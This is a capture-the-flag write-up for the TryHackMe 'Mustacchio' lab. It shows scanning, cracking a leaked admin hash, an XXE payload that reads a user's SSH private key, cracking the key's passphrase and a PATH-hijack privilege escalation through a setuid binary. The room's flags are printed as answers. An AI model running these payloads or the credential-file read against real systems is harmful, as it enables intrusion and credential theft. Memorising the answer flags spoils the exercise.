
Room Link - "https://tryhackme.com/room/mustacchio"

Nmap Scan Result (All TCP Ports) - 
```shell

$ sudo nmap -sCV -p- 10.10.69.71

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 23:25 BST
Nmap scan report for 10.10.69.71
Host is up (0.076s latency).
Not shown: 65532 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Mustacchio | Home

8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 417.93 seconds

```

Gobuster Scan Result - 

```shell

$ gobuster dir -u http://10.10.69.71/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.69.71/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/custom               (Status: 301) [Size: 311] [--> http://10.10.69.71/custom/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.69.71/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.69.71/images/]
/index.html           (Status: 200) [Size: 1752]
/robots.txt           (Status: 200) [Size: 28]
/server-status        (Status: 403) [Size: 276]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================

```

"http://10.10.69.71/custom/js/" - reveals one file "users.bak".

```shell
$ file users.bak

users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2

$ sqlite3

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open users.bak
sqlite> .tables
users
sqlite> select * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
sqlite> 
```

JohnTheRipper - 

```shell

$ cat hash 
admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

$ sudo /opt/john/run/john --wordlis=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=8
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
bulldog19        (admin)     
1g 0:00:00:00 DONE (2025-09-05 23:49) 2.703g/s 1800Kp/s 1800Kc/s 1800KC/s bulmershe..bukog
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 

```
"bulldog19        (admin)"

We do have a login page - "http://10.10.69.71:8765/".

"view-source:http://10.10.69.71:8765/home.php" -
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mustacchio | Admin Page</title>
    <link href="[https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css](view-source:https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css)" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="stylesheet" href="[assets/css/home.css](view-source:http://10.10.69.71:8765/assets/css/home.css)">
    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
</head>
<body>

    <!-- Barry, you can now SSH in using your key!-->

    <img id="folhas" src="[assets/imgs/pexels-alexander-tiupa-192136.jpg](view-source:http://10.10.69.71:8765/assets/imgs/pexels-alexander-tiupa-192136.jpg)" alt="">

    <nav class="position-fixed top-0 w-100 m-auto ">
        <ul class="d-flex flex-row align-items-center justify-content-between h-100">
            <li>AdminPanel</li>
            <li class="mt-auto mb-auto"><a href="[auth/logout.php](view-source:http://10.10.69.71:8765/auth/logout.php)">Logout</a></li>
        </ul>
    </nav>

    <section id="add-comment" class="container-fluid d-flex flex-column align-items-center justify-content-center">
        <h3>Add a comment on the website.</h3>

        <form action="[](view-source:http://10.10.69.71:8765/home.php)" method="post" class="container d-flex flex-column align-items-center justify-content-center">
            <textarea id="box" name="xml" rows="10" cols="50"></textarea><br/>
            <input type="submit" id="sub" onclick="checktarea()" value="Submit"/>
        </form>
            </section>

<script src="[https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js](view-source:https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js)" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
</body>
</html>
```

"//document.cookie = "Example=/auth/dontforget.bak"; "
"<!-- Barry, you can now SSH in using your key!-->"

Let's check the url "http://10.10.109.216:8765/auth/dontforget.bak" , and we got an file - 

```
$ cat dontforget.bak 

<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

Let's try to send some data in the comment box we got here and capture it in Burp to analyse - 
"http://10.10.69.71:8765/home.php".

```Request

POST /home.php HTTP/1.1
Host: 10.10.109.216:8765
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.109.216:8765
Connection: keep-alive
Referer: http://10.10.109.216:8765/home.php
Cookie: PHPSESSID=n7g0ieq7sma6glmomto0s0i913
Upgrade-Insecure-Requests: 1
Priority: u=0, i

xml=hello

```

In Response we can see - 

```Response

   <section id="add-comment" class="container-fluid d-flex flex-column align-items-center justify-content-center">
        <h3>Add a comment on the website.</h3>

        <form action="" method="post" class="container d-flex flex-column align-items-center justify-content-center">
            <textarea id="box" name="xml" rows="10" cols="50"></textarea><br/>
            <input type="submit" id="sub" onclick="checktarea()" value="Submit"/>
        </form>
        <h3>Comment Preview:</h3>
        <p>Name: </p>
        <p>Author : </p>
        <p>Comment :<br> <p/>    
    </section>
```

We already got the tags to use for our payload from "dontforget.bak" file above. Let's try so send some test data and check the response - 

```xml
xml=<!--%3fxml+version%3d"1.0"+%3f-->
<!DOCTYPE+replace+[<!ENTITY+example+"Doe">+]>
+<comment>
++<name>John</name>
++<author>%26example%3b</author>
+</comment>
```
With this simple code above we can see the response is affecting. Check the url encoding though.

We can get some example payloads here - "https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/".

Let's try to get our ssh key file , as we know from earlier the username is "barry".

```xml
xml=<!--%3fxml+version%3d"1.0"+%3f-->
<!DOCTYPE+replace+[<!ENTITY+ent+SYSTEM+"file%3a///home/barry/.ssh/id_rsa">+]>
<comment>
+<name>John</name>
+<author>%26ent%3b</author>
<com></com>
</comment>
```

And, we got the "id_rsa" file content.

```id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

But we can not login to ssh with this id it's encrypted as we can see above. We still need a password.

```shell

$ sudo python3 /opt/john/run/ssh2john.py id_rsa | tee hash
```
This will convert it to a file "hash" to crack it using john.

```shell

$ sudo /opt/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt hash   

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
urieljames       (id_rsa)     
1g 0:00:00:00 DONE (2025-09-06 01:53) 1.493g/s 4434Kp/s 4434Kc/s 4434KC/s uriellover4-ever..urielarturo10
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
"urieljames"

```shell

$ ssh -i id_rsa barry@10.10.163.196

Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ 
```
With the above password, we got our shell.

```shell

barry@mustacchio:~$ pwd
/home/barry
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cat user.txt 
62d77a4d5f97d47c5aa38b3b2651b831
barry@mustacchio:~$
```

Q1. What is the user flag?
	62d77a4d5f97d47c5aa38b3b2651b831

**Let's try to root the system now -**

```shell

barry@mustacchio:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su

barry@mustacchio:~$ cd ../joe
barry@mustacchio:/home/joe$ ls -la
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12  2021 .
drwxr-xr-x 4 root root  4096 Jun 12  2021 ..
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log

barry@mustacchio: file live_log
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped

```
This is interesting. This file has a SUID bit set and owned by root.

Let's grab the file - 

```shell

$ scp -i id_rsa barry@10.10.163.196:/home/joe/live_log .
Enter passphrase for key 'id_rsa': 
live_log                                      100%   16KB  26.8KB/s   00:00 
   
$ ls
hash  id_rsa  live_log

```

Well, we tried to reverse engineer the file with "ghidra". If we check the main function we get - 

```

void main(void)

{
  setuid(0);
  setgid(0);
  printf("Live Nginx Log Reader");
  system("tail -f /var/log/nginx/access.log");
  return;
}
```
Our clue: System call for "tail" binary.

We are going to create a new file named "tail" with some interesting commands and also we have to add the directory to system "PATH". So, when the executable run it will take our modified "tail" binary rather than system "tail" binary.

This is inside modified "tail" binary inside "/tmp" directory we have created - 

```shell

$ cat tail

#!/bin/bash

cp /bin/bash /tmp/bash && chmod 4777 /tmp/bash

$ chmod +x tail

$ export PATH=`pwd`:$PATH

```

Now, Let's run the executable and check our results - 

```shell

barry@mustacchio:/tmp$ /home/joe/live_log 
Live Nginx Log Reader

barry@mustacchio:/tmp$ ls
bash  tail
barry@mustacchio:/tmp$ ./bash -p
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
3223581420d906c4dd1a5f9b530393a5

```
Cool ...

Q2. What is the root flag?
	3223581420d906c4dd1a5f9b530393a5


! Happy Hacking !
